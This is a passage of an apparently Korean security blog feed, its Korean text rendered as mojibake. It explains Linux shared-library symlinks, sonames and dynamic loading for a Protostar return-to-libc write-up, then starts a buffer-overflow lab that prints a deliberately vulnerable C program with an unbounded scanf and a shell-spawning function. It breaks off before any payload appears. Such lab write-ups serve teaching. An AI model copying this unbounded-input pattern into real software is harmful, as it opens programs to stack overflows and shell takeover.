&lt;h1 id=&quot;3-ì‚½ì§ˆì´-ë‚¨ê¸´-ì§€ì‹&quot;&gt;3. ì‚½ì§ˆì´ ë‚¨ê¸´ ì§€ì‹&lt;/h1&gt;

&lt;h2 id=&quot;31-ë¦¬ëˆ…ìŠ¤ì—ì„œ-í”„ë¡œê·¸ë¨-ì»´íŒŒì¼-ì‹œ-referë˜ëŠ”-ê³µìœ -ë¼ì´ë¸ŒëŸ¬ë¦¬ì™€-ê·¸-í˜¸ì¶œ-ê³¼ì •&quot;&gt;3.1. ë¦¬ëˆ…ìŠ¤ì—ì„œ í”„ë¡œê·¸ë¨ ì»´íŒŒì¼ ì‹œ referë˜ëŠ” ê³µìœ  ë¼ì´ë¸ŒëŸ¬ë¦¬ì™€ ê·¸ í˜¸ì¶œ ê³¼ì •&lt;/h2&gt;

&lt;p&gt;ë¨¼ì € pwndbgì—ì„œ vmmapì„ ì´ìš©í•´ ì–´ë–¤ ë¼ì´ë¸ŒëŸ¬ë¦¬ê°€ ë§í‚¹ë˜ì–´ ìˆëŠ”ì§€ ë³´ì.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2016.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[libc-2.27.so](http://libc-2.27.so)&lt;/code&gt; íŒŒì¼ê³¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[ld-2.27.so](http://ld-2.27.so)&lt;/code&gt; íŒŒì¼ì´ ë§í‚¹ë˜ì–´ ìˆëŠ” ê²Œ ë³´ì¸ë‹¤. ì—¥? ê·¸ëŸ°ë° ì´ìƒí•˜ë‹¤. ë¶„ëª…íˆ ìš°ë¦¬ê°€ ldd, ì¦‰ libc database ì»¤ë§¨ë“œë¡œ í™•ì¸í–ˆì„ ë•Œ ì‚¬ìš©ëœ ë¼ì´ë¸ŒëŸ¬ë¦¬ëŠ” ì•„ë˜ì™€ ê°™ì•˜ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%204.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì•„ë‹ˆ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt; ì´ë‘ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ld-linux.so.2&lt;/code&gt; ì¼ë‹¤ë©°? ê·¸ëŸ°ë° ì™œ ì •ì‘ ì‚¬ìš©ëœ ê±´ ë‹¤ë¥¸ ê±°ì•¼??&lt;/p&gt;

&lt;h3 id=&quot;311-file-link&quot;&gt;3.1.1. File Link&lt;/h3&gt;

&lt;p&gt;ì´ì— ê´€í•´ì„œëŠ” ë¦¬ëˆ…ìŠ¤ì˜ soft linkì™€ linkerì˜ ë™ì  ë¼ì´ë¸ŒëŸ¬ë¦¬ í˜¸ì¶œì— ëŒ€í•´ ì•ˆë‹¤ë©´ ë‹µì„ ì•Œ ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë¨¼ì € ë¦¬ëˆ…ìŠ¤ì—ëŠ” íŒŒì¼ ë§í¬ë¼ëŠ” ì‹œìŠ¤í…œì´ ìˆëŠ”ë°, ì´ëŠ” ìœˆë„ìš°ì˜ ë°”ë¡œê°€ê¸°ì™€ ìƒë‹¹íˆ ë¹„ìŠ·í•˜ë‹¤. ì´ íŒŒì¼ ë§í¬ëŠ” ì²«ì§¸, í•˜ë“œ ë§í¬(Hard Link)ì™€ ë‘˜ì§¸, ì†Œí”„íŠ¸ ë§í¬(Soft Link or Symbolic Link) ë‘ ê°œ ì¢…ë¥˜ë¡œ ë‚˜ë‰˜ëŠ”ë°, ë‘˜ì˜ ì°¨ì´ì ì€ ì›ë³¸ íŒŒì¼ê³¼ ë™ì¼í•œ inodeë¥¼ ê°€ì§€ëŠëƒ, ë‹¤ë¥¸ inodeë¥¼ ê°€ì§€ëŠëƒì´ë‹¤. inodeì— ê´€í•´ì„œëŠ” osë¥¼ ê³µë¶€í–ˆë‹¤ë©´ ì•Œ ìˆ˜ ìˆëŠ”ì§€ë¼ ìì„¸íˆ ì„¤ëª…í•˜ì§„ ì•Šê² ì§€ë§Œ íŒŒì¼ ì‹œìŠ¤í…œ ìƒì—ì„œ íŒŒì¼ì„ í˜¸ì¶œí•  ë•Œ ì°¸ê³ í•˜ëŠ” inode tableìƒì˜ index ë²ˆí˜¸ ì •ë„ë¡œ ì„¤ëª…ì„ í‰ì¹˜ê³  ë„˜ì–´ê°€ë ¤ í•œë‹¤.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;í•˜ë“œ ë§í¬ëŠ” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ln {original file} {linked file}&lt;/code&gt; ëª…ë ¹ì–´ë¡œ ìƒì„±í•œë‹¤. ì´ ê²½ìš° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -li&lt;/code&gt; ëª…ë ¹ì–´ë¡œ inodeë¥¼ í™•ì¸í•œë‹¤ë©´ ì›ë³¸ íŒŒì¼ê³¼ ë§í¬ëœ íŒŒì¼ì˜ inode ë²ˆí˜¸ê°€ ë™ì¼í•¨ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ì´ë¡œ ì¸í•´ ì›ë³¸ íŒŒì¼ì˜ ìœ„ì¹˜ê°€ ë°”ë€Œë”ë¼ë„ ë§í¬ëœ íŒŒì¼ì„ ì‹¤í–‰í•˜ë©´ ì›ë³¸ íŒŒì¼ì´ ì‹¤í–‰ëœë‹¤.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ì†Œí”„íŠ¸ ë§í¬ëŠ” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ln -s {original file} {linked file}&lt;/code&gt; ëª…ë ¹ì–´ë¡œ ìƒì„±í•œë‹¤. ì´ ê²½ìš° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -li&lt;/code&gt; ëª…ë ¹ì–´ë¡œ inodeì™€ íŒŒì¼ ì •ë³´ë¥¼ í™•ì¸í•œë‹¤ë©´ ì›ë³¸ íŒŒì¼ê³¼ ë§í¬ëœ íŒŒì¼ì˜ inode ë²ˆí˜¸ê°€ ë‹¤ë¥´ë©°, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-&amp;gt;&lt;/code&gt; ê¸°í˜¸ë¡œ ë§í¬ê°€ í‘œì‹œë˜ì–´ ìˆìŒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ì´ë¡œ ì¸í•´ ì›ë³¸ íŒŒì¼ì˜ ìœ„ì¹˜ê°€ ë°”ë€Œë©´ ë§í¬ëœ íŒŒì¼ì„ ì‹¤í–‰í–ˆì„ ë•Œ ë§í¬ê°€ ì›ë³¸ íŒŒì¼ì„ ì°¾ì§€ ëª»í•œë‹¤. ì•„ë˜ ì‚¬ì§„ì€ ì†Œí”„íŠ¸ ë§í¬ë¥¼ í™•ì¸í–ˆì„ ë•Œì˜ ì‚¬ì§„ì´ë‹¤.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2017.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;ê°€ì¥ ì²« ë²ˆì§¸ì— ë³´ì´ëŠ” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[libc-2.27.so](http://libc-2.27.so)&lt;/code&gt; íŒŒì¼ì˜ inode numì€ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6816882&lt;/code&gt; ì¸ë°, í•´ë‹¹ íŒŒì¼ì— ì†Œí”„íŠ¸ ë§í¬ê°€ ê±¸ë ¤ ìˆëŠ” ê°€ì¥ ë§ˆì§€ë§‰ì˜ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt; íŒŒì¼ì˜ inode numì€ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6816904&lt;/code&gt; ë¡œ ì„œë¡œ ë‹¤ë¥´ë‹¤ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ì¢‹ì•„, ê·¸ë ‡ë‹¤ë©´ íŒŒì¼ ì‹¤í–‰ ì‹œ &lt;strong&gt;ê³µìœ  ë¼ì´ë¸ŒëŸ¬ë¦¬&lt;/strong&gt;ë¡œëŠ” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt; ì„ ì¼ê¸° ë•Œë¬¸ì— ì†Œí”„íŠ¸ ë§í¬ì˜ ì˜¤ë¦¬ì§€ë„ íŒŒì¼ì¸ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[libc-2.27.so](http://libc-2.27.so)&lt;/code&gt; ê°€ ì‚¬ìš©ëê³  &lt;strong&gt;Dynamic Loader&lt;/strong&gt;ë¡œëŠ” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ld-linux.so.2&lt;/code&gt; ë¥¼ ì¼ê¸° ë•Œë¬¸ì— ë§í¬ê°€ ê±¸ë¦° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[ld-2.27.so](http://ld-2.27.so)&lt;/code&gt; ê°€ ì‚¬ìš©ëë‹¤ê³  ì¹˜ì. (ì•„ë˜ ì‚¬ì§„ ì°¸ê³ )&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2018.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ê·¸ëŸ°ë° ë˜ ê¶ê¸ˆí•œ ê²Œ ìƒê¸´ë‹¤. so íŒŒì¼ì´ ë­”ì§€ëŠ” ì•Œê² ëŠ”ë°â€¦ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;so.2&lt;/code&gt;ì™€ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;so.6&lt;/code&gt;ì€ ëŒ€ì²´ ë¬´ìŠ¨ ëœ»ì´ì•¼?&lt;/p&gt;

&lt;h3 id=&quot;312-gccë¥¼-ì´ìš©í•œ-c-ì–¸ì–´-ì»´íŒŒì¼-ì‹œ-íŒŒì¼-ì‹¤í–‰-ì‹œì˜-í–‰ìœ„&quot;&gt;3.1.2. GCCë¥¼ ì´ìš©í•œ C ì–¸ì–´ ì»´íŒŒì¼ ì‹œ, íŒŒì¼ ì‹¤í–‰ ì‹œì˜ í–‰ìœ„&lt;/h3&gt;

&lt;p&gt;ê²°ë¡ ì ìœ¼ë¡œ ë§í•˜ìë©´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.so&lt;/code&gt; íŒŒì¼ì€ í•´ë‹¹ ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ ëŒ€í‘œ í˜¸ì¹­ ê²©ì¸ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Linker name&lt;/code&gt;ì´ê³ ,  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.so.2&lt;/code&gt; ë“± ë’¤ì— ìˆ«ìê°€ ë¶™ì€ íŒŒì¼ì€ í•´ë‹¹ ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ í•˜ìœ„ ê²©ì¸ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;soname&lt;/code&gt; ì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ëŠ” ì •ì  ë¼ì´ë¸ŒëŸ¬ë¦¬(&lt;em&gt;.a)ì™€ ë™ì (ê³µìœ ) ë¼ì´ë¸ŒëŸ¬ë¦¬(&lt;/em&gt;.so) ë‘ ì¢…ë¥˜ê°€ ì¡´ì¬í•œë‹¤ëŠ” ê±´ ì•„ë§ˆ ì´ ë¸”ë¡œê·¸ì¯¤ ì˜¨ ì‚¬ëŒë“¤ì´ë¼ë©´ ì•ŒìŒì•ŒìŒ ì•Œ ê²ƒì´ë¯€ë¡œ ìƒëµí•œë‹¤. ìœˆë„ìš°ì—ì„œëŠ” ë™ì  ë¼ì´ë¸ŒëŸ¬ë¦¬ë¡œ *.dll íŒŒì¼ì„ ì“´ë‹¤ëŠ” ê±´â€¦ ì“°ê³  ì‹¶ìœ¼ë‹ˆê¹Œ ì“¸ê±°ë‹¤.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ì»´íŒŒì¼ ì‹œì˜ í–‰ìœ„:
    &lt;ul&gt;
      &lt;li&gt;í”„ë¡œê·¸ë¨ ì»´íŒŒì¼ ì‹œ íŠ¸ë¦¬ê±°ëœ ë§ì»¤ëŠ” ì»´íŒŒì¼ëŸ¬ì™€ í”„ë¡œê·¸ë¨ì„ ì°¸ê³ í•´ í•„ìš”í•œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Linker name&lt;/code&gt;ì„ ê°€ì§„ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì°¾ì•„ë‚´ê³ , í•´ë‹¹ ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;soname&lt;/code&gt;ì„ ì½ì–´ì˜¨ë‹¤.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;íŒŒì¼ ì‹¤í–‰ ì‹œì˜ í–‰ìœ„:
    &lt;ul&gt;
      &lt;li&gt;ì´í›„ ì»´íŒŒì¼ëœ í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰í•  ë•Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dynamic Loader&lt;/code&gt; ê°€ ì‹¤í–‰ë˜ê³  ì´ê²ƒì´ Dynamic Link ëœ ê³µìœ  ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;soname&lt;/code&gt; ì„ ì´ìš©í•´ ê°ì¢… ë³€ìˆ˜ë¡œë¶€í„° ìœ„ì¹˜ë¥¼ ì°¾ì•„ë‚¸ ë‹¤ìŒ ë©”ëª¨ë¦¬ì— ë„ì›Œ ì¤€ë‹¤. ê·¸ë ‡ë‹¤. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dynamic Loader&lt;/code&gt; ê°€ RTL ê¸°ë²•ì˜ ì£¼ë²”ì´ì—ˆë˜ ê²ƒì´ë‹¤â€¦&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ì•„ë¬´íŠ¼, ì•ì„œ ì ê¹ ì–¸ê¸‰í–ˆë˜ íŒŒì¼ ì‹¤í–‰ ì‹œì˜ í–‰ìœ„ë¥¼ ì´ì œ ì•Œì•„ë‚¸ ì •ë³´ë¥¼ ì´ìš©í•´ ë” êµ¬ì²´í™”í•´ ë³´ì. ì•ì„œ ì•Œì•„ë³´ì•˜ë“¯ í•´ë‹¹ íŒŒì¼ì—ê²Œ ì§€ì •ëœ Dynamic LoaderëŠ” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[ld-](http://ld-2.27.so)linux.so.2&lt;/code&gt; ì¸ë°, ì‹¬ë³¼ë¦­ ë§í¬ ì •ì±…ìœ¼ë¡œ ì¸í•´ ì‹¤ì œë¡œëŠ” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[ld-2.27.so](http://ld-2.27.so)&lt;/code&gt; ê°€ ì‚¬ìš©ëœë‹¤. íŒŒì¼ ì‹¤í–‰ ì‹œ íŠ¸ë¦¬ê±°ëœ Dynamic LoaderëŠ” sonameì„ ì´ìš©í•´ ì–´ë–¤ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í• ì§€ ì°¾ì•„ë‚¸ë‹¤.&lt;/p&gt;

&lt;p&gt;ì—¬ê¸°ì—ì„œ sonameì„ ê°€ì§„ ë¼ì´ë¸ŒëŸ¬ë¦¬ëŠ” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt;ì´ê¸° ë•Œë¬¸ì— Dynamic LoaderëŠ” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt; ì„ ì‹¤í–‰ì‹œí‚´ìœ¼ë¡œì¨ ë©”ëª¨ë¦¬ì— ì ì¬í•˜ë ¤ í•œë‹¤. ê·¸ëŸ°ë°, ì‹¬ë³¼ë¦­ ë§í¬ ì •ì±…ìœ¼ë¡œ ì¸í•´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[libc-2.27.so](http://libc-2.27.so)&lt;/code&gt; ê°€ ì‹¤í–‰ë˜ë©° ë©”ëª¨ë¦¬ì— ì ì¬ëœë‹¤. ì´ë¡œ ì¸í•´ ì‹¤í–‰ ìƒíƒœì¸ í”„ë¡œê·¸ë¨ì— ì‚¬ìš©ëœ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•˜ë©´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt; ìœ¼ë¡œ ëœ¨ì§€ ì•ŠëŠ”ë‹¤.&lt;/p&gt;

&lt;p&gt;ë§ˆì§€ë§‰ ì˜ë¬¸ì´ í•˜ë‚˜ ìƒê¸´ë‹¤. ì™œ êµ³ì´? ì™œ êµ³ì´ ì´ë ‡ê²Œ ì‹¬ë³¼ë¦­ ë§í¬ë¥¼ ì¨ì„œ ëŒì•„ ëŒì•„ ê°€ëŠ” ê²ƒì¼ê¹Œ? ê·¸ ì´ìœ ëŠ” ë¼ì´ë¸ŒëŸ¬ë¦¬ ì—°ê²°ì˜ í˜¸í™˜ì„±ì„ ì¢‹ê²Œ í•˜ê¸° ìœ„í•´ì„œì´ë‹¤. í†µìƒì ìœ¼ë¡œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{library_name.so.1.5}-&amp;gt;{library_name.so}&lt;/code&gt; ì˜ êµ¬ë„ë¡œ ë§í¬ê°€ ê±¸ë¦¬ëŠ”ë°, ì´ëŠ” ê°œë°œ í™˜ê²½ì— &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.so.1.5&lt;/code&gt; ë²„ì „ì˜ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¿ ì•„ë‹ˆë¼ ë‹¤ë¥¸ ë²„ì „ì˜ ë¼ì´ë¸ŒëŸ¬ë¦¬ë„ ì¡´ì¬í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ì–´ë–¤ ë²„ì „(ì–´ë–¤ soname)ì„ ì‚¬ìš©í•˜ë“  ì•ˆì •ì ìœ¼ë¡œ í•„ìš”í•œ Linker nameì„ ê°€ì§„ ë¼ì´ë¸ŒëŸ¬ë¦¬ì™€ ì—°ê²°í•´ì£¼ê¸° ìœ„í•´ì„œ ìƒê²¨ë‚œ ë°©ì‹ì´ë‹¤.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;4-ì°¸ê³ ë¬¸í—Œ&quot;&gt;4. ì°¸ê³ ë¬¸í—Œ&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;x64dbg ë””ë²„ê±°ë¥¼ í™œìš©í•œ ë¦¬ë²„ì‹±ê³¼ ì‹œìŠ¤í…œ í•´í‚¹ì˜ ì›ë¦¬(ê¹€ë¯¼ìˆ˜ ì €, 210p RTL)&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Sun, 13 Nov 2022 20:31:23 +0900</pubDate>
        <link>http://localhost:4000/blog/protostar-stack5-x86-x64/</link>
        <guid isPermaLink="true">http://localhost:4000/blog/protostar-stack5-x86-x64/</guid>
      </item>
    
      <item>
        <title>System Hackig Step 5-3</title>
        <description>&lt;h1 id=&quot;stage-5-3-bof-return-address-overwrite&quot;&gt;STAGE 5-3: BOF-Return Address Overwrite&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;Stack Buffer Overflowë¡œ ì¸í•´ ê°€ëŠ¥í•œ Return Address ì¡°ì‘ ê³µê²©ì„ ì‹¤ìŠµ&lt;/li&gt;
  &lt;li&gt;í•´ë‹¹ ì·¨ì•½ì ì´ ì¡´ì¬í•˜ëŠ” ì˜ˆì œ í”„ë¡œê·¸ë¨ ê³µê²© ë° ì…¸ íšë“ì´ ëª©í‘œ&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;ë¨¼ì €-í’€ì–´ë³´ê¸°&quot;&gt;ë¨¼ì € í’€ì–´ë³´ê¸°:&lt;/h1&gt;

&lt;h2 id=&quot;1-ì˜ˆì œ-ì½”ë“œ-ì·¨ì•½ì -ë¶„ì„í•˜ê¸°&quot;&gt;1. ì˜ˆì œ ì½”ë“œ ì·¨ì•½ì  ë¶„ì„í•˜ê¸°&lt;/h2&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;setvbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;setvbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
	
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Input: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;setvbuf í•¨ìˆ˜ëŠ” file I/O ì‘ì—… ì‹œ í•´ë‹¹ ì‘ì—…ì˜ ì†ë„ê°€ ë©”ëª¨ë¦¬ë¥¼ ì½ê³  ì“°ëŠ” ê²ƒì— ë¹„í•´ ë„ˆë¬´ ëŠë¦¬ë‹¤ ë³´ë‹ˆ ë²„í¼ë¥¼ ì„ ì–¸í•˜ê³  íŒŒì¼ì— ì“¸ ë°ì´í„°/ ì½ì–´ì˜¬ ë°ì´í„°ë¥¼ ëŒ€ìš©ëŸ‰ìœ¼ë¡œ í•œ ë²ˆì— ì €ì¥í•œ í›„ ì§€ì •ëœ ì¡°ê±´ì„ ë§Œì¡±í•˜ë©´ íŒŒì¼ì™€ì˜ ìƒí˜¸ì‘ìš©ì„ í•˜ê²Œë” í•´ì„œ ë¹„íš¨ìœ¨ì ì¸ ìì› ì‚¬ìš©ì„ ì§€ì–‘í•˜ê¸° ìœ„í•´ ì‚¬ìš©ëœë‹¤.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ìœ„ ì½”ë“œì˜ exploitable í•œ ë¶€ë¶„ì€ ì‚¬ìš©ìì™€ì˜ ìƒí˜¸ì‘ìš©ì„ í•˜ëŠ” ë¶€ë¶„, ì¦‰ main í•¨ìˆ˜ì—ì„œ Inputì„ ë°›ëŠ” ë¶€ë¶„ì´ë‹¤. í•´ë‹¹ ë¶€ë¶„ì— payloadë¥¼ ì…ë ¥í•˜ë©´ ìµìŠ¤ê°€ ê°€ëŠ¥í•  ê²ƒì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ê·¸ë ‡ë‹¤ë©´ ì–´ë–¤ í˜•íƒœì˜ ìµìŠ¤ê°€ ê°€ëŠ¥í• ê¹Œ? mainí•¨ìˆ˜ì—ì„œ bufë¼ëŠ” ì§€ì—­ë³€ìˆ˜ë¥¼ ë‹¨ í•˜ë‚˜ ì„¤ì •í•´ ë‘ì—ˆê³ , ì·¨ì•½í•œ í•¨ìˆ˜ì¸ scanf í•¨ìˆ˜ë¥¼ ì¼ë‹¤. ë˜í•œ main í•¨ìˆ˜ì˜ ìŠ¤íƒ í”„ë ˆì„ì€ buf ì•„ë˜ì— libc_start_main í•¨ìˆ˜ì˜ SFP, ê·¸ë¦¬ê³  ê·¸ ì•„ë˜ì— ripì˜ ret addë¡œ êµ¬ì„±ë˜ì–´ ìˆì„ ê²ƒì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ì¦‰, ret add ì¡°ì‘ìœ¼ë¡œ ì´ì–´ì§€ëŠ” ìŠ¤íƒ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ì¼ìœ¼í‚¬ ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;2-í˜ì´ë¡œë“œ-êµ¬ìƒí•˜ê¸°&quot;&gt;2. í˜ì´ë¡œë“œ êµ¬ìƒí•˜ê¸°&lt;/h2&gt;

